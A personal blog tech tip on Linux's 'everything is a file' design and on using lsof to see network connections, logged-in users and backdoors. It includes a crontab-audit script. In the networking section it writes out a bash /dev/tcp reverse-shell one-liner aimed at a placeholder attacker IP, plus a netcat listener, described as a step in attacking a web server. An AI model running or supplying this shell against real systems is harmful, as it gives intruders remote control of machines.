+++
title = 'Quick Tech Tip: lsof'
date = 2025-04-21T16:16:41-05:00
draft = false
tags = ["Gems"]
categories = ["CyberSecurity", "QTT"]
+++

So here is a newsflash for all non-Linux people:

# EVERYTHING IN LINUX IS A FILE. LITERALLY EVERYTHING

## Microphones

Your devices like your camera and microphone are mounted at /dev. The ulility "arecord" from the alsa-utils uses this little trick to allow you to do stuff like open the microphone file and forward the data to other command line tools like mpv:

```
arecord -f cd - | mpv -
```

## Cameras
The same can be done with your camera, except it's ffmpeg that relies on the camera being a file:

```
ffmpeg -f v4l2 -i /dev/video0 -f mpegts - | mpv -
```

## FIFO Files

There are some files that act as queues for other programs to pick up data from other programs. They are called [FIFO or Pipe-Files](https://en.wikipedia.org/wiki/Named_pipe).  


## Data Production Files

There are devices that have specific functions like `zero`, `null`, and `random` that produce a specific data like zeros, nothing, or gobbledegook. 

## And so many more

Seriously... everything is a file in Linux and you can do all sorts of crazy stuff once you realize that all tools that work with the UNIX philosophy are supposed to be able to pipe data from one file to the next. But the most interesting of these is the network files.

# Networking files

One thing that only really hackers and Linux devs seem to be aware of is that the mechanism that Linux uses for setting up network connections (sockets) is through creating a socket file attached to the /dev/tcp directory. 

The following command is a standard shell forwarding command. Typically, you would use an unprivileged RCE (Like with a web shell) to run the following command on the web server you're attacking:

```
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
```

The above command spawns a bash shell and gives it to another machine at port 1337. The hacker will point that to their IP Address and make sure that there is a tool called netcat listening for it:


```
nc -nvlp 1337
```

# LSOF

So now that you know that everything in Linux is a file, you can appreciate the tool [LSOF, or "list open file"](https://www.man7.org/linux/man-pages/man8/lsof.8.html).

You should read this man page, because lsof can find all sorts of stuff. It can tell you which files are being used by which programs, it can tell you who is running what... but my favorite use of lsof is seeing what processes are talking to what servers:

```
sudo lsof -i
```

Run the command as sudo because you'll be able to see way more than the standard user. I typically use this instead of netstat or ps because it's far more human readable and detailed. It's like the command line equivalent of the game, Clue. 

"It was user A, in /usr/bin, with a tcp socket".

# Something we learned about lsof in XFR

There is a command called "who" or "w", that's designed to tell you who is logged into the machine you're on at the moment that you run it. 

We were using a zero-trust solution for logging into a certain box called Teleport, and we sometimes wanted to see who was ssh'ed in. We could have opened the GUI page for it and look at the audit logs, but my boss and I are Linux neckbeards, so we wanted to just stay on the box all day. 

The problem was that when you use "who", it didn't work. The reason comes down to how "who" checks in on the users. It was missing the mechanism that teleport was using, either because it came in through a seperate namespace, or PAM thing, or whatever. It just didn't show up for "who".

But it TOTALLY showed up for lsof. Every network connection needed a socket and every socket is a file, so we could run lsof -i and see every user on the box. It was glorious.

We also knew what each user was supposed to be running, so this method helped us see users doing shady network things (Like my weird sshuttle tomfoolery) very easily.

It was also really good for finding backdoors. Chances are if there was a backdoor in your server, lsof would tell you a user was connecting to a server / service that you didn't recognize.

side note: Another way to look for backdoors is running a script like this to check all the users' crontabs:

```
#!/bin/bash

# Output file for crontab dumps
output_file="all_crontabs.txt"

# Clear the output file if it exists
> "$output_file"

# Get a list of all users
users=$(cut -f1 -d: /etc/passwd)

# Loop through each user
for user in $users; do
    # Get the user's crontab
    crontab_output=$(crontab -u "$user" -l 2>/dev/null)

    # Check if the user has a crontab
    if [ $? -eq 0 ]; then
        echo "Crontab for user: $user" >> "$output_file"
        echo "$crontab_output" >> "$output_file"
        echo "------------------------" >> "$output_file"
    fi
done

echo "All crontabs have been dumped to $output_file."
```

# Fun Story:

When I was an apprentice at X-Force Red, one of the Linux machines wasn't locked properly, so my boss decided to teach us a lesson and installed 3 back doors. 

1. A unix socket bind shell.

2. A crontab back door.

3. cat'ted his ssh pub key into the authorized key file. 

At the time, I was a noob, so I wasn't sure how to find them... so I cheated and just took the infected machine offline. XD. That said, lsof would have found 2 of them. The third would have been caught by using a host-based IDS or even just an entr command.

# So What?

I admit, this tech tip was a bit more scattered than the others, but remember the following:

1. Everything in Linux is a file. *[Insert Annie meme here](https://www.youtube.com/watch?v=A_iAE2JIyEE)*

2. Every open file can be seen by lsof.

3. Network connections that escape other tools don't escape lsof.

4. Look for backdoors with lsof, looking at crontabs, and check your authorized keys files for ssh every once in a while. 
